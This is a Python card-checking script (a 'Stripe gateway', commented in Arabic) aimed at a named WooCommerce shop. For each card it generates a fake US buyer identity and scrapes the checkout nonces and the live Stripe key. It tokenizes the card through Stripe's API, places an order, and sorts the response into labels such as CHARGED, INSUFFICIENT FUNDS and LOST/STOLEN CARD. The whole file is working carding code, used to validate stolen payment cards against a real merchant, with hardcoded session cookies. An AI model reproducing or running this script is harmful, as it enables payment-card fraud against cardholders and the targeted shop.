# ==================== gatet.py (للموقع الجديد Anas-Emporium - Stripe Gateway) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_us_data():
    """توليد بيانات عنوان أمريكي صالح"""
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia',
                   'John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura', 'Conane', 'Kand']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis',
                  'Caril', 'Hatleyb', 'Payne', 'Betran']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    us_states = ['AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA', 'HI', 'ID', 'IL', 'IN', 'IA', 
                 'KS', 'KY', 'LA', 'ME', 'MD', 'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ', 
                 'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC', 'SD', 'TN', 'TX', 'UT', 'VT', 
                 'VA', 'WA', 'WV', 'WI', 'WY', 'VI']
    us_cities = ['Los Angeles', 'Houston', 'Chicago', 'Brooklyn', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin',
                 'New York', 'Miami', 'Seattle', 'Denver', 'Boston', 'Atlanta', 'Detroit', 'Portland', 'Nashville']
    us_postcodes = ['90001', '77001', '60601', '11201', '85001', '19101', '78201', '92101', '75201', '73301', '10001', '33101']
    us_phones = ['2135551234', '7135551234', '3125551234', '7185551234', '6025551234', '2155551234', '5640439480']
    us_addresses = ['75 po box', '123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Street', '654 Maple Drive']
    
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', '@gmail.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
        'phone': random.choice(us_phones),
        'address_1': random.choice(us_addresses),
        'city': random.choice(us_cities),
        'state': random.choice(us_states),
        'postcode': random.choice(us_postcodes),
        'company': f"{first}'s {random.choice(['Auto', 'Parts', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def ch(ccx):
    print("\n" + "="*70)
    print("[DEBUG] STARTING NEW CHECK - Anas-Emporium (Stripe Gateway - US)")
    print("="*70)
    
    ccx = ccx.strip()
    n = ccx.split("|")[0].replace(' ', '')
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_us_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    print(f"[1/7] Using User-Agent: {user[:50]}...")
    print(f"[1/7] Generated fake data: {fake_data['first_name']} {fake_data['last_name']}, {fake_data['email']}")
    print(f"[1/7] Address: {fake_data['address_1']}, {fake_data['city']}, {fake_data['state']}, {fake_data['postcode']}")
    
    # ================ 1. ADD TO CART (منتج مع variation) ================
    print("\n[2/7] Adding product to cart...")
    
    cookies_add = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
        '__stripe_mid': '58841910-b5b2-4216-ac6b-2d942142e94ce54754',
        '__stripe_sid': '18fb3013-6209-4d1c-b4c1-3dd29e6096be7c1cb6',
    }
    
    files = {
        'attribute_color': (None, 'White'),
        'quantity': (None, '1'),
        'add-to-cart': (None, '2033'),
        'product_id': (None, '2033'),
        'variation_id': (None, '2039'),
    }
    
    headers_add = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US',
        'origin': 'https://anas-emporium.com',
        'referer': 'https://anas-emporium.com/product/simple-temperament-niche-design-pull-out-ladies-bracelet/',
        'user-agent': user,
        'upgrade-insecure-requests': '1',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.post('https://anas-emporium.com/product/simple-temperament-niche-design-pull-out-ladies-bracelet/', 
                      headers=headers_add, files=files, cookies=cookies_add)
    print(f"[2/7] Add to cart status: {response.status_code}")
    print(f"[2/7] Add to cart response: {response.text[:200]}")
    
    if response.status_code != 200:
        return f'ADD_TO_CART_FAILED'
    
    # ================ 2. CHECKOUT PAGE ================
    print("\n[3/7] Accessing checkout page...")
    
    headers_checkout = {
        'Accept-Language': 'en-US',
        'Referer': 'https://anas-emporium.com/cart/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.get('https://anas-emporium.com/checkout/', headers=headers_checkout)
    print(f"[3/7] Checkout page status: {response.status_code}")
    
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    # ================ 3. EXTRACT NONCES ================
    print("\n[4/7] Extracting nonces...")
    
    sec = re.search(r'wc-ajax=update_order_review[^"]*security[^"]*"?\s*value="([^"]+)"', response.text)
    if not sec:
        sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
    if sec:
        sec = sec.group(1)
        print(f"[4/7] Found update_order_review nonce: {sec[:20]}...")
    else:
        sec = 'edaf945150'
        print("[4/7] WARNING: Using fallback nonce")
    
    check_nonce = re.search(r'woocommerce-process-checkout-nonce[^"]*"?\s*value="([^"]+)"', response.text)
    if not check_nonce:
        check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
    if check_nonce:
        check_nonce = check_nonce.group(1)
        print(f"[4/7] Found checkout nonce: {check_nonce[:20]}...")
    else:
        check_nonce = '047d7d6468'
        print("[4/7] WARNING: Using fallback checkout nonce")
    
    # استخراج Stripe key
    stripe_key_match = re.search(r'pk_live_[a-zA-Z0-9]+', response.text)
    if stripe_key_match:
        stripe_key = stripe_key_match.group(0)
        print(f"[4/7] Found Stripe key: {stripe_key[:20]}...")
    else:
        stripe_key = 'pk_live_51H1RaXC9vQQqXaaq7qI7eZcBYsVjVmiCJNC0r5zlK6cM5idA0JtKFabs9BRvbLU8DaO2PBh6dz6doU04IzEFSuI100hImGeE5f'
        print("[4/7] Using fallback Stripe key")
    
    # ================ 4. UPDATE ORDER REVIEW ================
    print("\n[5/7] Updating order review...")
    
    cookies_update = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
        'wp_woocommerce_session_f1ff18e17fcd94bf2b9e3d5c17b3e4f8': 't_9eaa8086c9c8b3e968cd370a397d01%7C1779440018%7C1779353618%7C%24generic%24J7RznWHVRXt8tp7z7GkIqv67jqD_cLrzERusaVHs',
        '__stripe_mid': '58841910-b5b2-4216-ac6b-2d942142e94ce54754',
        '__stripe_sid': '18fb3013-6209-4d1c-b4c1-3dd29e6096be7c1cb6',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': '531e4a448eed85e8bb08abe41c5848b5',
    }
    
    headers_update = {
        'accept': '*/*',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://anas-emporium.com',
        'referer': 'https://anas-emporium.com/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=stripe&country=US&state={fake_data["state"]}&postcode={fake_data["postcode"]}&city={fake_data["city"]}&address={fake_data["address_1"].replace(" ", "+")}&address_2=&s_country=US&s_state={fake_data["state"]}&s_postcode={fake_data["postcode"]}&s_city={fake_data["city"]}&s_address={fake_data["address_1"].replace(" ", "+")}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fanas-emporium.com%252F%26wc_order_attribution_session_start_time%3D2026-05-20%252008%253A52%253A36%26wc_order_attribution_session_pages%3D13%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_email%3D{fake_data["email"]}%26billing_first_name%3D{fake_data["first_name"]}%26billing_last_name%3D{fake_data["last_name"]}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{fake_data["address_1"].replace(" ", "+")}%26billing_address_2%3D%26billing_city%3D{fake_data["city"]}%26billing_state%3D{fake_data["state"]}%26billing_postcode%3D{fake_data["postcode"]}%26billing_phone%3D{fake_data["phone"]}%26shipping_first_name%3D{fake_data["first_name"]}%26shipping_last_name%3D{fake_data["last_name"]}%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D{fake_data["city"]}%26shipping_state%3D{fake_data["state"]}%26shipping_postcode%3D{fake_data["postcode"]}%26order_comments%3D%26shipping_method%255B0%255D%3Dflat_rate%253A1%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26woocommerce-process-checkout-nonce%3D{check_nonce}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A1'
    
    response = r.post('https://anas-emporium.com/', params=params_update, headers=headers_update, data=data_update, cookies=cookies_update)
    print(f"[5/7] Update order review status: {response.status_code}")
    print(f"[5/7] Update order review response: {response.text[:300]}")
    
    # ================ 5. CREATE STRIPE PAYMENT METHOD (Tokenization) ================
    print("\n[6/7] Creating Stripe payment method...")
    
    # توليد معرفات عشوائية جديدة لكل طلب
    client_session_id = str(uuid.uuid4())
    elements_session_id = f"elements_session_{random.randint(10, 99)}Iy3mdyjGf{random.randint(1, 9)}"
    elements_session_config_id = str(uuid.uuid4())
    guid = f"{str(uuid.uuid4()).replace('-', '')[:24]}"
    muid = '58841910-b5b2-4216-ac6b-2d942142e94ce54754'
    sid = '18fb3013-6209-4d1c-b4c1-3dd29e6096be7c1cb6'
    
    headers_stripe = {
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    # تنسيق رقم البطاقة مع مسافات كل 4 أرقام (لـ Stripe)
    formatted_card = ' '.join([n[i:i+4] for i in range(0, len(n), 4)])
    
    data_stripe = f'billing_details[name]={fake_data["first_name"]}+{fake_data["last_name"]}&billing_details[email]={fake_data["email"]}&billing_details[phone]={fake_data["phone"]}&billing_details[address][city]={fake_data["city"]}&billing_details[address][country]=US&billing_details[address][line1]={fake_data["address_1"].replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={fake_data["postcode"]}&billing_details[address][state]={fake_data["state"]}&type=card&card[number]={formatted_card}&card[cvc]={cvc}&card[exp_year]={yy[-2:]}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fe27e2486c8%3B+stripe-js-v3%2Fe27e2486c8%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fanas-emporium.com&time_on_page=68457&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_id]={elements_session_id}&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={stripe_key}&_stripe_version=2025-09-30.clover'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
    print(f"[6/7] Stripe payment method status: {response.status_code}")
    
    # ================ استخراج الـ error من Stripe response ================
    try:
        response_json = response.json()
        
        # التحقق من وجود خطأ
        if 'error' in response_json:
            error = response_json['error']
            error_message = error.get('message', '').lower()
            error_code = error.get('code', '')
            
            print(f"[6/7] Stripe error: {error_message}")
            print(f"[6/7] Stripe error code: {error_code}")
            
            # ==================== ردود Stripe المفصلة ====================
            if 'insufficient funds' in error_message:
                return 'INSUFFICIENT FUNDS'
            elif 'your card has been declined' in error_message:
                return 'CARD DECLINED'
            elif 'the card was declined' in error_message:
                return 'CARD DECLINED'
            elif 'card was declined' in error_message:
                return 'CARD DECLINED'
            elif 'your card number is incorrect' in error_message or 'invalid_number' in error_code:
                return 'INVALID CARD NUMBER'
            elif 'expired card' in error_message or 'expired_card' in error_code:
                return 'EXPIRED CARD'
            elif 'incorrect_cvc' in error_code or 'cvv' in error_message:
                return 'CVV MISMATCH'
            elif 'do_not_honor' in error_code:
                return 'DO NOT HONOR'
            elif 'fraud' in error_message or 'fraudulent' in error_message:
                return 'SUSPECTED FRAUD'
            elif '3d_secure' in error_code or 'authentication_required' in error_code:
                return '3D SECURE REQUIRED'
            elif 'processing_error' in error_code:
                return 'PROCESSOR DECLINED'
            else:
                return f'STRIPE: {error_message}'
        
        # نجاح - استخراج payment method ID
        payment_method_id = response_json.get('id')
        if payment_method_id:
            print(f"[6/7] Got payment method ID: {payment_method_id}")
        else:
            print(f"[6/7] No payment method ID in response")
            return 'STRIPE_TOKENIZATION_FAILED'
            
    except Exception as e:
        print(f"[6/7] Failed to parse Stripe response: {e}")
        print(f"[6/7] Response text: {response.text[:200]}")
        return f'STRIPE_ERROR'
    
    # ================ 6. FINAL CHECKOUT ================
    print("\n[7/7] Processing final checkout...")
    
    cookies_final = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-20%2008%3A52%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fanas-emporium.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
        'wp_woocommerce_session_f1ff18e17fcd94bf2b9e3d5c17b3e4f8': 't_9eaa8086c9c8b3e968cd370a397d01%7C1779440018%7C1779353618%7C%24generic%24J7RznWHVRXt8tp7z7GkIqv67jqD_cLrzERusaVHs',
        '__stripe_mid': muid,
        '__stripe_sid': sid,
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': '531e4a448eed85e8bb08abe41c5848b5',
    }
    
    headers_final = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://anas-emporium.com',
        'referer': 'https://anas-emporium.com/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fanas-emporium.com%2F&wc_order_attribution_session_start_time=2026-05-20+08%3A52%3A36&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_email={fake_data["email"]}&billing_first_name={fake_data["first_name"]}&billing_last_name={fake_data["last_name"]}&billing_company=&billing_country=US&billing_address_1={fake_data["address_1"].replace(" ", "+")}&billing_address_2=&billing_city={fake_data["city"]}&billing_state={fake_data["state"]}&billing_postcode={fake_data["postcode"]}&billing_phone={fake_data["phone"]}&shipping_first_name={fake_data["first_name"]}&shipping_last_name={fake_data["last_name"]}&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city={fake_data["city"]}&shipping_state={fake_data["state"]}&shipping_postcode={fake_data["postcode"]}&order_comments=&shipping_method%5B0%5D=flat_rate%3A1&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&woocommerce-process-checkout-nonce={check_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={payment_method_id}'
    
    response = r.post('https://anas-emporium.com/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
    print(f"[7/7] Final checkout status: {response.status_code}")
    
    # ================ 8. PARSE RESULT ================
    print("\n[8/8] Parsing result...")
    
    try:
        result_data = json.loads(response.text)
        messages = result_data.get("messages", "")
        full_response = response.text
        print(f"[8/8] Response JSON: {json.dumps(result_data, indent=2)[:500]}")
    except:
        print(f"[8/8] Raw response: {response.text[:500]}")
        return 'PARSE_ERROR'
    
    clean_messages = clean_html(messages)
    clean_full = clean_html(full_response)
    search_text = clean_messages + " " + clean_full
    
    reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
    reason = reason_match.group(1).strip() if reason_match else None
    
    print(f"\n[DEBUG] Clean response: {search_text[:300]}")
    
    # ==================== ردود Stripe الكاملة والمفصلة ====================
    
    success_keywords = ['charged', 'success', 'completed', 'approved', 'payment successful', 'order received', 
                        'thank you for your order', 'order confirmed', 'transaction approved', 'payment completed',
                        'payment succeeded', 'charge succeeded']
    if any(keyword in search_text for keyword in success_keywords):
        return 'CHARGED'
    
    # بطاقة مرفوضة (Declined)
    declined_keywords = ['your card has been declined', 'card declined', 'the card was declined', 'card was declined']
    if any(keyword in search_text for keyword in declined_keywords):
        return 'CARD DECLINED'
    
    # رقم بطاقة غير صحيح
    if 'your card number is incorrect' in search_text or 'invalid card number' in search_text:
        return 'INVALID CARD NUMBER'
    
    # رصيد غير كافٍ
    if 'insufficient funds' in search_text:
        return 'INSUFFICIENT FUNDS'
    
    # بطاقة منتهية
    if 'expired card' in search_text or 'card expired' in search_text:
        return 'EXPIRED CARD'
    
    # CVV خطأ
    if 'cvv' in search_text or 'cvv verification failed' in search_text or 'incorrect_cvc' in search_text:
        return 'CVV MISMATCH'
    
    # Do Not Honor
    if 'do not honor' in search_text:
        return 'DO NOT HONOR'
    
    # احتيال
    if 'fraud' in search_text or 'suspected fraud' in search_text or 'fraudulent' in search_text:
        return 'SUSPECTED FRAUD'
    
    # 3D Secure مطلوب
    if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text or 'authentication_required' in search_text:
        return '3D SECURE REQUIRED'
    
    # بطاقة مفقودة أو مسروقة
    if 'lost or stolen' in search_text:
        return 'LOST/STOLEN CARD'
    
    # تجاوز الحد
    if 'limit exceeded' in search_text:
        return 'LIMIT EXCEEDED'
    
    # عنوان غير مطابق
    if 'address verification' in search_text or 'avs' in search_text:
        return 'ADDRESS MISMATCH'
    
    # خطأ في المعالجة
    if 'processing error' in search_text or 'processor declined' in search_text:
        return 'PROCESSOR DECLINED'
    
    # أي سبب تاني من الـ Reason
    if reason and len(reason) < 50:
        return reason.upper()
    
    if clean_messages and len(clean_messages) < 100:
        return clean_messages.title()
    
    if 'declined' in search_text:
        return 'CARD DECLINED'
    
    return 'CARD DECLINED'
